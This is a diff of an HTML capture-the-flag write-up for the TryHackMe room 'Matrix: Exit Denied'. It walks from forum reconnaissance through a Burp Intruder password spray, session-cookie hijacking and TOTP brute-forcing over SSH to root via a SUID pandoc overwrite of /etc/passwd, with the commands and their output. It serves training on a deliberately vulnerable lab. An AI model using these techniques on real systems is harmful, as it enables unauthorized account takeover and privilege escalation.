@@ -18,27 +18,49 @@
   <div class="meta-row">
     <span class="pill">Room: Matrix: Exit Denied</span>
     <span class="pill">Category: Web / OSINT / Linux Privesc</span>
-    <span class="pill">Tools: Burp Suite, Gobuster, John the Ripper</span>
+    <span class="pill">Tools: Gobuster, Burp Intruder, CyberChef</span>
   </div>
 
   <div class="brief">
-    <p><strong>The setup:</strong> a Linux-Bay forum, a bug bounty report that was never actually secured, and a trail of puzzles hidden behind each layer of access. The job: work from anonymous forum browsing all the way to root, picking up four separate flags along the way.</p>
-    <p>Flags intentionally omitted below, this is about the path, not the values.</p>
+    <p><strong>The setup:</strong> a Linux box running a MyBB forum, nothing else handed over. Four separate flags are hidden across the chain, user, root, an admin control panel PIN, and one buried in a web application data file. Several of the actual flag values are redacted in the original notes (the room's own screenshots black them out), so the technique matters here more than any single answer.</p>
+    <p>This one has a lot of moving parts, organized below in the order they were actually found.</p>
   </div>
 
   <section>
-    <h2 class="section-title">The Investigation</h2>
+    <h2 class="section-title">Part 1: Finding a Way In</h2>
     <div class="steps">
 
       <div class="step">
         <div class="step-num">1</div>
         <div class="step-body">
-          <div class="step-title">Enumerate the site and the forum's staff list</div>
-          <p>A directory scan turns up a long list of paths, admin panels, upload folders, an archive directory, far more surface than the front page suggests. The site itself is a MyBB forum, and browsing it without even logging in exposes the full staff roster, super moderators, admins, and regular moderators alike.</p>
-          <pre><code>gobuster dir -u http://&lt;target&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></pre>
+          <div class="step-title">Scan, then brute-force directories</div>
+          <pre><code>nmap -sV -sC 10.10.20.150
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Linux-Bay
+3306/tcp open  mysql   MySQL 5.5.5-10.1.47-MariaDB-0ubuntu0.18.04.1</code></pre>
+          <pre><code>gobuster dir -u http://10.10.20.150 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t16
+
+/images      (Status: 301)
+/login       (Status: 200)
+/archive     (Status: 200) [--> http://10.10.20.150/archive]
+/files       (Status: 301)
+/uploads     (Status: 200) [--> http://10.10.20.150/uploads/]
+/admin       (Status: 301) [--> http://10.10.20.150/admin/]
+/flag        (Status: 200) [Size: 240]
+/inc         (Status: 301) [--> http://10.10.20.150/inc/]
+/secret      (Status: 200) [Size: 241]
+/panel       (Status: 200) [Size: 241]
+/administrator (Status: 200) [Size: 241]
+/jscripts    (Status: 301) [--> http://10.10.20.150/jscripts/]
+/change_password (Status: 200) [Size: 240]
+/analyse     (Status: 200) [Size: 443]</code></pre>
+          <p><code>/admin/index.php</code> turns out to be a MyBB forum login page, "Linux-Bay."</p>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Forum software often exposes its member/staff list by design, for transparency, not realizing it's handing attackers a ready-made target list. Combined with a wide directory scan, this is pure reconnaissance: know who to target before attacking anything.</p>
+            <p>A lot of these gobuster hits are decoys, same response size as a generic 200, a reminder that directory brute-forcing surfaces candidates, not answers. <code>/admin</code> redirecting to a real login page is what actually matters here.</p>
           </div>
         </div>
       </div>
@@ -46,11 +68,19 @@
       <div class="step">
         <div class="step-num">2</div>
         <div class="step-body">
-          <div class="step-title">Register an account and dig through a user's posts</div>
-          <p>One staff member's profile is hinted at elsewhere on the site. Creating a throwaway forum account and searching their post history for clues turns up a reference to an internal bug bounty program, and a path to its report form.</p>
+          <div class="step-title">Harvest usernames without logging in</div>
+          <p>MyBB's Team page lists every Super Moderator, Administrator, and Moderator without requiring an account: <code>BlackCat</code> (Super Moderator), an Administrator account, and a Moderators list including <code>ArnoldBagger</code>, <code>BlackCat</code>, <code>BlueMan</code>, <code>DotHaxer</code>, and <code>DrBert</code> among others. The Members directory separately surfaces a user named <strong>Willis</strong> alongside a "White Rabbit" hint on the page.</p>
+          <p>Registering a forum account and searching posts by <code>Willis</code> turns up a single thread, "Bug Bounty Program," referencing a hidden path:</p>
+          <pre><code>We are committed to protecting our community from future cyber attacks.
+If you're a security expert or enthusiast who actively participates in
+finding security holes in web applications, then linux-bay needs you.
+To participate all you need to do is ensure you report any minor
+weaknesses to the following page: /bugbountyHQ and we will attempt to
+resolve said issues. Please note: if the security weakness is considered
+critical then please PM me or any of the mods, thank you</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>A forum's own search feature is a reconnaissance tool once you have an account. Internal programs mentioned casually in old posts are exactly the kind of detail that doesn't show up in an automated scan.</p>
+            <p>A public team roster is a free username list, and a forum's own search feature is enough OSINT to find a thread never meant to be the main attraction. The "report it here" page is the real target precisely because it was built to receive untrusted input.</p>
           </div>
         </div>
       </div>
@@ -58,11 +88,24 @@
       <div class="step">
         <div class="step-num">3</div>
         <div class="step-body">
-          <div class="step-title">Read an unsecured vulnerability report for a credential list</div>
-          <p>The bug bounty submission form itself is disabled, but its client-side source (viewed via the browser's inspector) references a results page that was never actually locked down. That page lists a backlog of previously reported vulnerabilities, including one flagging that the forum's login has no CAPTCHA or lockout, protecting against password spraying, and a list of common weak passwords the reporter used to prove it.</p>
+          <div class="step-title">Follow the bug bounty page to a leaked vulnerability report</div>
+          <p><code>/bugbountyHQ</code> shows a disabled submission form, "under maintenance." Inspecting the form element reveals where it actually posts to:</p>
+          <pre><code>&lt;form method="post" action="/reportPanel.php"&gt;
+  &lt;h2&gt;Bug Bounty Report Form&lt;/h2&gt;
+  &lt;p style="color:red;"&gt;(Disabled: under maintenance until further notice)&lt;/p&gt;</code></pre>
+          <p><code>/reportPanel.php</code> loads directly, no authentication required, and lists every bug report ever submitted, including one critical finding that spells out the forum's exact weakness:</p>
+          <pre><code>Edwards  Alexandra  Edwards@mail.com  critical  21/02/21
+
+your mybb login system is not using any 'captcha mechanism' or 'failed
+login timeout method' which makes it very vulnerable to password spray
+attacks. Considering several surveys have found that 3 in 5 online
+users use weak passwords such as: password123, Password123, crabfish,
+linux123, secret, piggybank, windowsxp, starwars, supermario,
+Luisfactor05, james123, etc, i would say you should ASAP implement some
+protection to avoid future data breaches</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>A disabled front-end form doesn't mean the backend page is gone, it just means the usual path to it is hidden. And a security report describing a weakness is itself a roadmap if the report page is reachable by anyone.</p>
+            <p>An unauthenticated report viewer is already a bug on its own, but the real gift here is a disclosed vulnerability (no login lockout) paired with a ready-made weak-password wordlist, both handed over for free by the application meant to track security issues.</p>
           </div>
         </div>
       </div>
@@ -70,11 +113,105 @@
       <div class="step">
         <div class="step-num">4</div>
         <div class="step-body">
-          <div class="step-title">Spray the staff list against the leaked weak passwords</div>
-          <p>With a list of staff usernames from step 1 and a list of weak passwords from the vulnerability report, Burp Intruder's cluster bomb attack (every username against every password) against the login endpoint finds valid credentials by comparing response lengths, the real hits stand out immediately from the uniform "invalid login" responses.</p>
+          <div class="step-title">Spray it with Burp Intruder</div>
+          <p>Capturing a login attempt in Burp shows the raw POST:</p>
+          <pre><code>POST /member.php HTTP/1.1
+Host: 10.10.207.150
+Content-Type: application/x-www-form-urlencoded
+
+username=admin&amp;password=pass&amp;submit=Login&amp;action=do_login&amp;...</code></pre>
+          <p>Sent to Intruder with two payload positions marked (<code>username</code> and <code>password</code>), attack type set to <strong>Cluster bomb</strong> (every username tried against every password): payload set 1 is the Mod/Admin roster from the team page, payload set 2 is the weak-password list from the leaked report. 117 total requests later, two responses stand out by their <code>Length</code> column, distinctly shorter than the uniform "invalid login" response every failed attempt returns:</p>
+          <pre><code>Request  Payload1       Payload2   Status  Length
+102      ArnoldBagger   ...        200     5985
+90       PalacerKing    ...        200     5985
+0        blackCat       ...        200     10604
+100      blackCat       ...        200     10604</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Credential spraying works precisely because most login failures look identical, a response of a different length or status is a reliable tell for a match, no manual checking of every attempt required.</p>
+            <p>A successful login renders a completely different page than a failed one, so the response length is a reliable signal even without reading every result individually. Cluster bomb mode is exactly suited for "try every combination of these two independent lists" rather than lockstep pairing.</p>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <section>
+    <h2 class="section-title">Part 2: The Keymaker's Puzzle</h2>
+    <div class="steps">
+
+      <div class="step">
+        <div class="step-num">1</div>
+        <div class="step-body">
+          <div class="step-title">Decode a hidden cipher on the report page</div>
+          <p>The <code>reportPanel.php</code> page source hides a <code>&lt;p hidden&gt;</code> element, a "Keymaker message" made of two separate encoded strings. The first is a run of numbers all between 1 and 26:</p>
+          <pre><code>1 16 5 18 13 21 20 1 20 9 15 14 15 6 15 14 12 25 20 8 5 5 14 7 12 9 19 8
+12 5 20 20 5 18 19 23 9 12 12 15 16 5 14 20 8 5 12 15 3 11 19
+
+1 4 4 18 5 19 19</code></pre>
+          <p>That's a straightforward A1Z26 cipher (1=A, 2=B, ...), decoded with an online tool:</p>
+          <pre><code>Transformed text:
+a permutation of only the english letters will open the locks
+address</code></pre>
+          <p>The second part of the message is a binary string, which decodes to ASCII as "Keymaker," followed by a segment of the binary itself blacked out in the source notes, it decodes to a directory name on the server, but that specific value isn't recoverable from what's captured here (it's a genuine redaction in the source, not reproduced).</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>A1Z26 and binary-to-ASCII are both trivial once recognized, the harder skill is just noticing the pattern (numbers capped at 26, strings of only 0s and 1s) and knowing which decoder to reach for.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">2</div>
+        <div class="step-body">
+          <div class="step-title">Find six letters hidden inside Chinese characters</div>
+          <p>The decoded directory hosts an animated Matrix-style webpage. Its page source, under the Console tab, embeds a JavaScript variable holding a long string of Chinese characters with a comment labeling it:</p>
+          <pre><code>#keymaker: "English letters below"
+chinese = "..."
+alphabet = "abcdefghijkllmnopqrstuvwxyz"
+for i in chinese:
+    if i in alphabet:
+        print(i, end='')</code></pre>
+          <p>Running that extraction script against the captured string pulls out exactly six Latin letters hiding among the Chinese text:</p>
+          <pre><code>$ python3 chinese.py
+ofqxvg
+6 letters</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>Mixed-script text is an easy place to hide a short signal in a lot of noise, a human skimming the page sees "Chinese characters" and moves on, but a simple membership check against the English alphabet filters it out in one pass.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">3</div>
+        <div class="step-body">
+          <div class="step-title">Session-hijack into a higher-privilege account</div>
+          <p>Logged in as the cracked <code>ArnoldBagger</code> account, a private message to "Soapsvector" references another hidden path, <code>/devBuilds</code>, holding an offline v2 build. Separately, swapping ArnoldBagger's session cookie for BlackCat's value (via the browser's Storage/Cookies inspector) and refreshing the page logs the browser in as <code>BlackCat</code> instead, no password needed:</p>
+          <pre><code>mybb[lastvisit]=1628560163
+mybb[lastactive]=1628559127
+mybbuser=7_JY1AvB8cqCMkIFprMxWbTxwf8dSkiv7GJHzLPDWJWWg9gnG3FB</code></pre>
+          <p>BlackCat's Attachment Manager (a higher-privilege Super Moderator folder) holds several files worth pulling down: <code>testing.zip</code>, <code>hardwareToken.jpg</code>, <code>DevTools.zip</code>, <code>Releases.txt</code>, two SSH-TOTP architecture diagrams, and an <code>SSH-TOTP documentation.pdf</code>.</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>A session cookie <em>is</em> the login, MyBB (like most session-based auth) never re-checks the password after the cookie is issued. Swapping in someone else's valid cookie value is functionally identical to knowing their password, as long as the cookie itself is reachable.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">4</div>
+        <div class="step-body">
+          <div class="step-title">Learn what the SSH login is actually protected by</div>
+          <p>One of the downloaded files, a testing document, reveals the SSH login for user <code>architect</code> is secured with TOTP (time-based one-time passwords), and lists three candidate shared-secret tokens still being validated:</p>
+          <pre><code>SSH-TOTP Testing document
+Shared secret Tokens   Device type    Username    Working?
+128939448577488        Arduino NG     architect   inconclusive
+592988748673453        Arduino USB    architect   inconclusive
+792513759492579        Arduino Uno    architect   inconclusive</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>TOTP only works if the client and server clocks agree closely, and it only works at all if you have the shared secret seed. This leaked testing doc hands over three candidate seeds without needing to break the TOTP algorithm itself.</p>
           </div>
         </div>
       </div>
@@ -82,11 +219,12 @@
       <div class="step">
         <div class="step-num">5</div>
         <div class="step-body">
-          <div class="step-title">Work through a layered cipher puzzle</div>
-          <p>Hidden page content leads through several encoding layers in sequence: a numeric string that turns out to be an A1Z26 cipher (numbers mapping to letters) decodes to a hint about "a permutation of letters," a second binary string decodes to ASCII text that turns out to be a directory name, and that directory holds a page whose source contains a long string of Chinese characters, each one secretly representing one of six specific English letters. Extracting just those letters and brute-forcing every arrangement of them (a permutation, following the earlier hint) eventually opens the next door.</p>
+          <div class="step-title">Sync the clock without breaking the system timezone</div>
+          <p>Changing the whole system timezone to UTC didn't stick, it reverted automatically. Scoping the fix to just the one command that needs it works cleanly instead:</p>
+          <pre><code>TZ=UTC sudo python3 Matrixbrute.py --full-time</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>None of these individual encodings are strong, A1Z26, binary, and a character substitution are all textbook puzzle layers. The challenge is recognizing each one for what it is and chaining the decodes in the right order, exactly the kind of pattern-matching that gets faster with CTF experience.</p>
+            <p>TOTP codes are only valid for a narrow time window, so even a few minutes of clock drift breaks every guess. Setting <code>TZ</code> as an environment variable for a single command avoids fighting whatever process (likely a systemd timesync unit) kept reverting the full system change.</p>
           </div>
         </div>
       </div>
@@ -94,42 +232,150 @@
       <div class="step">
         <div class="step-num">6</div>
         <div class="step-body">
-          <div class="step-title">Hijack a session by swapping cookies</div>
-          <p>A private forum message between two staff members references an internal build directory that seems to be offline. Inspecting the browser's stored cookies for that domain and swapping the session cookie value for a different staff member's session logs the browser in as that user on refresh, no credentials needed at all.</p>
+          <div class="step-title">Brute-force the TOTP window and SSH in immediately</div>
+          <pre><code>$ TZ=UTC sudo python3 Matrixbrute.py --full-time
+Thu 12 Aug 2021 04:45:08 PM UTC
+Time Sync Completed Successfully.
+Conducting brute-force on OTP.
+
+26f53ac93baa2e97ba96e2
+899de5e5ea4100d2b2b993
+3ba2fd5ca6ec785e02fc1d
+e1a6cedd5e0d9cdf525e61
+Success with: e1a6cedd5e0d9cdf525e61
+
+Execute this command: ssh architect@10.10.142.28 with this password: e1a6cedd5e0d9cdf525e61
+You have 60 seconds or less to run this command.</code></pre>
+          <p>The six letters from the Chinese-character puzzle (<code>ofqxvg</code>) are what seed which permutation the script tries, a password built from "a permutation of only the English letters," exactly as the A1Z26 hint said. Immediately after, before the TOTP window rotates:</p>
+          <pre><code>$ ssh architect@10.10.142.28
+"Give up now... There is no escape from the matrix" -Agent Smith
+architect@10.10.142.28's password: e1a6cedd5e0d9cdf525e61
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-136-generic x86_64)
+
+"I have been expecting you... You are on time..." -the architect
+architect@matrixV99:~$</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>A session cookie is the entire proof of identity for most web logins. If a cookie value tied to another account can simply be substituted in and accepted, session management itself is the vulnerability, no password required.</p>
+            <p>Every earlier step (the cipher, the hidden letters, the leaked seeds, the clock sync) was a prerequisite for this one 60-second window. Miss the timing and the whole chain has to restart from a fresh TOTP code.</p>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <section>
+    <h2 class="section-title">Part 3: Root, and the Remaining Flags</h2>
+    <div class="steps">
+
+      <div class="step">
+        <div class="step-num">1</div>
+        <div class="step-body">
+          <div class="step-title">Find the SUID binary that shouldn't be there</div>
+          <pre><code>architect@matrixV99:/$ find / -perm -u=s 2>/dev/null
+
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/sudo
+/usr/bin/chfn
+/usr/bin/pkexec
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/pandoc
+/bin/mount
+/bin/su
+
+root@matrixV99:/home/architect# ls -la /usr/bin/pandoc
+-rwsr-sr-x 1 root root 80908912 Mar  8 16:55 /usr/bin/pandoc</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>Most of this list is expected, <code>sudo</code>, <code>passwd</code>, and friends are supposed to run as root. <code>pandoc</code>, a document converter, has no business being SUID, which is exactly what makes it worth investigating.</p>
           </div>
         </div>
       </div>
 
       <div class="step">
-        <div class="step-num">7</div>
+        <div class="step-num">2</div>
         <div class="step-body">
-          <div class="step-title">Pull an SSH credential out of an OTP scheme and brute-force it under a synced clock</div>
-          <p>The hijacked account's private attachments include documentation for an SSH login protected by time-based one-time passwords, along with several candidate shared-secret tokens. A small purpose-built script tries each token's generated OTP against SSH, but only succeeds if the attacking machine's clock is tightly synced to UTC first:</p>
-          <pre><code>TZ=UTC sudo python3 matrixbrute.py --full-time</code></pre>
-          <p>Once the clock is right, the brute force succeeds within its short validity window and SSH access follows.</p>
+          <div class="step-title">Use pandoc's SUID bit to overwrite /etc/passwd</div>
+          <pre><code>architect@matrixV99:~$ cp /etc/passwd .
+architect@matrixV99:~$ ls
+helloVisitor.txt  motd.net  passwd  user.txt
+architect@matrixV99:~$ openssl passwd Hacked
+xngpSLPODPFmw
+architect@matrixV99:~$ nano passwd</code></pre>
+          <p>Inside <code>nano</code>, the first line's password field (the <code>x</code> placeholder) gets replaced with the hash just generated:</p>
+          <pre><code>root:xngpSLPODPFmw:0:0:root:/root:/bin/bash</code></pre>
+          <p>Then pandoc, running with its own SUID root privileges, writes that edited copy over the real file:</p>
+          <pre><code>architect@matrixV99:~$ pandoc passwd -t plain -o /etc/passwd
+[WARNING] Could not deduce format from file extension
+  Defaulting to markdown
+architect@matrixV99:~$ su root
+Password: Hacked
+root@matrixV99:/home/architect# whoami
+root</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>TOTP codes are only valid for a short rolling window, usually 30 seconds, tied to wall-clock time. A brute-force attempt against a TOTP-protected login has to respect that same clock or every attempt will be rejected regardless of whether the underlying secret is correct.</p>
+            <p>pandoc can read and write arbitrary files as root because of the SUID bit, and it doesn't care that the "document" it's converting happens to be <code>/etc/passwd</code>. Giving root a known password hash is a complete, durable privilege escalation, not just a one-off shell.</p>
           </div>
         </div>
       </div>
 
       <div class="step">
-        <div class="step-num">8</div>
+        <div class="step-num">3</div>
         <div class="step-body">
-          <div class="step-title">Escalate through a SUID pandoc binary</div>
-          <p>Hunting for SUID binaries on the box turns up <code>pandoc</code>, document conversion software not normally run with elevated privileges. Pandoc can convert between arbitrary formats, including writing its own output file, which makes it capable of overwriting <code>/etc/passwd</code> with a version that sets a known password hash for root:</p>
-          <pre><code>cp /etc/passwd .
-openssl passwd &lt;new-password&gt;
-<span class="cm"># paste the resulting hash into the passwd copy, replacing root's x</span>
-pandoc passwd -t plain -o /etc/passwd
-su root</code></pre>
+          <div class="step-title">Run an oddly-named script for the root flag</div>
+          <p>A file named <code>-- -root.py</code> turns up during enumeration, the leading dashes make it resist normal access, the shell tries to interpret them as flags for whatever command touches it. <code>find</code> locates its real relative path cleanly:</p>
+          <pre><code>root@matrixV99:/etc# find . -name '--*root.py'
+./-- -root.py</code></pre>
+          <p>Quoting the filename lets Python treat it as a literal path instead of a set of flags:</p>
+          <pre><code>root@matrixV99:/etc# python3 './-- -root.py'
+$ > You've been Hacked!!!!REQ> Source: Matrix v.99; Destination: Real world;
+$ > EXIT GRANTED;
+$ > Exiting Matrix... Entering real world... Please wait...
+LOADING... [####################] 100%</code></pre>
+          <p>The root flag prints at the bottom (redacted in the source notes, not reproduced here).</p>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Any SUID binary capable of writing to an arbitrary output path is a privilege escalation risk if that output path can be a sensitive system file. Pandoc was never designed as an attack tool, but "converts and writes files" plus "runs as root" adds up to exactly that.</p>
+            <p>A filename starting with <code>-</code> is a classic way to make a file awkward to reference directly, since most commands will try to parse it as an option. Quoting the full path, or prefixing with <code>./</code>, sidesteps the ambiguity entirely.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">4</div>
+        <div class="step-body">
+          <div class="step-title">Grep for the admin PIN across likely directories</div>
+          <pre><code>root@matrixV99:/var# grep -rn "PIN"
+install/resources/upgrade30/upgrade30.php:2418: &lt;div class="title"&gt;ACP PIN Configuration&lt;/div&gt;
+install/resources/upgrade30/upgrade30.php:2443: $config['secret_pin']</code></pre>
+          <p>That points at a config file, found and read directly:</p>
+          <pre><code>root@matrixV99:/var/www/html# find . -name config.php
+./inc/config.php
+root@matrixV99:/var/www/html# cat ./inc/config.php</code></pre>
+          <p>Near the bottom:</p>
+          <pre><code>$config['secret_pin'] = &lt;redacted in source&gt;;</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>Grepping for a keyword like "PIN" across a scoped directory (<code>/var</code>, since this is web-application data) is much faster than guessing a config file's location outright, and the application code itself names the exact variable to look for.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">5</div>
+        <div class="step-body">
+          <div class="step-title">Grep for the web flag inside raw database files</div>
+          <pre><code>root@matrixV99:/var# grep -rni "flag{"
+Binary file lib/mysql/mybb/mybb_datacache.MYD matches
+Binary file lib/mysql/mybb/mybb_templates.MYD matches
+Binary file lib/mysql/mybb/mybb_themestylesheets.MYD matches
+Binary file lib/mlocate/mlocate.db matches</code></pre>
+          <p>Catting the first hit directly dumps the flag inline among the raw MyISAM table data (redacted in the source, not reproduced):</p>
+          <pre><code>cat /var/lib/mysql/mybb/mybb_datacache.MYD</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>A flag stored inside application data (not a standalone text file) won't show up in a normal filesystem walk, but it will show up in a content grep across the right directory, here, MySQL's raw table files on disk, bypassing the database layer entirely.</p>
           </div>
         </div>
       </div>
@@ -139,39 +385,58 @@ su root</code></pre>
 
   <section>
     <h2 class="section-title">Full Attack Chain</h2>
-    <pre><code>gobuster + forum browsing &rarr; staff roster and wide directory list exposed
-  &rarr; registered account &rarr; post history leaks a bug bounty program
-       &rarr; unsecured report page &rarr; weak-password list leaked
-            &rarr; Burp Intruder cluster bomb &rarr; staff credentials found
-                 &rarr; multi-layer cipher chain &rarr; hidden directory unlocked
-                      &rarr; cookie swap &rarr; session hijacked, no password needed
-                           &rarr; TOTP brute force (clock-synced) &rarr; SSH access
-                                &rarr; SUID pandoc &rarr; /etc/passwd overwritten, root</code></pre>
+    <pre><code>gobuster + forum Team page &rarr; usernames + /bugbountyHQ hint
+  &rarr; /reportPanel.php: leaked weak-password list
+       &rarr; Burp Intruder cluster bomb: ArnoldBagger + PalacerKing cracked
+            &rarr; reportPanel.php source: A1Z26 + binary cipher
+                 &rarr; hidden directory: Chinese-character page hides 6 letters
+                      &rarr; cookie swap: ArnoldBagger session &rarr; BlackCat session
+                           &rarr; BlackCat's attachments: SSH-TOTP seeds leaked
+                                &rarr; TZ=UTC + Matrixbrute.py: TOTP window cracked
+                                     &rarr; SSH as architect (60s window)
+                                          &rarr; SUID pandoc: /etc/passwd overwritten, root
+                                               &rarr; oddly-named script: root flag
+                                               &rarr; grep /var: ACP PIN + web flag</code></pre>
+  </section>
+
+  <section>
+    <h2 class="section-title">Tools Used</h2>
+    <div class="ref-wrap">
+      <table class="ref">
+        <tr><th>Tool</th><th>Purpose</th></tr>
+        <tr><td>Gobuster</td><td>Directory brute-forcing</td></tr>
+        <tr><td>Burp Suite Intruder</td><td>Cluster bomb credential spray against the forum login</td></tr>
+        <tr><td>A1Z26 / binary decoders, CyberChef-style tools</td><td>Decoding the Keymaker's hidden message</td></tr>
+        <tr><td>Browser DevTools (Storage/Cookies)</td><td>Session cookie hijacking from ArnoldBagger to BlackCat</td></tr>
+        <tr><td>Matrixbrute.py (provided)</td><td>TOTP code brute force against the leaked shared secrets</td></tr>
+        <tr><td>pandoc (SUID abuse)</td><td>Overwriting /etc/passwd for a root shell</td></tr>
+      </table>
+    </div>
   </section>
 
   <section>
     <h2 class="section-title">Takeaways</h2>
     <div class="skills">
       <div class="skill">
-        <div class="skill-title">Disabled front-ends don't mean the backend is gone</div>
-        <p>A form that's visually turned off is still worth checking for a reachable results page, API, or endpoint behind it.</p>
+        <div class="skill-title">Public forum metadata is reconnaissance</div>
+        <p>A team roster and a searchable post history, both completely ordinary forum features, delivered usernames and a hidden-page hint with zero exploitation involved.</p>
       </div>
       <div class="skill">
-        <div class="skill-title">A vulnerability report is a roadmap if it's exposed</div>
-        <p>Documentation of a weakness, written for defenders, is exactly as useful to an attacker if it's not access-controlled.</p>
+        <div class="skill-title">A vulnerability tracker is itself an attack surface</div>
+        <p>An unauthenticated bug bounty report viewer handed over both a disclosed weakness (no login lockout) and a ready-made password list in one page.</p>
       </div>
       <div class="skill">
-        <div class="skill-title">Session cookies need to be bound to more than just a value</div>
-        <p>If swapping in another valid session's cookie value is enough to become that user, session management itself needs hardening, independent of password strength.</p>
+        <div class="skill-title">Session cookies are bearer tokens</div>
+        <p>Possessing a valid session cookie is equivalent to knowing the password behind it. Anywhere a cookie can be read or copied, it can be replayed.</p>
       </div>
       <div class="skill">
-        <div class="skill-title">Time-based codes require a correctly set clock, for both sides</div>
-        <p>Attacking (or defending) a TOTP scheme means respecting the same time window the algorithm does, a wrong clock defeats a correct secret just as surely as a wrong secret does.</p>
+        <div class="skill-title">An unexpected SUID bit is worth investigating every time</div>
+        <p>pandoc has no inherent reason to run as root. The SUID bit itself, not any flaw in pandoc, was the actual vulnerability.</p>
       </div>
     </div>
   </section>
 
-  <footer>tryhackme.com &middot; solved via OSINT, credential spraying, cipher puzzles, and SUID privilege escalation</footer>
+  <footer>tryhackme.com &middot; solved via OSINT, credential spraying, multi-layer cipher decoding, and SUID privilege escalation</footer>
 
 </div>
 </body>
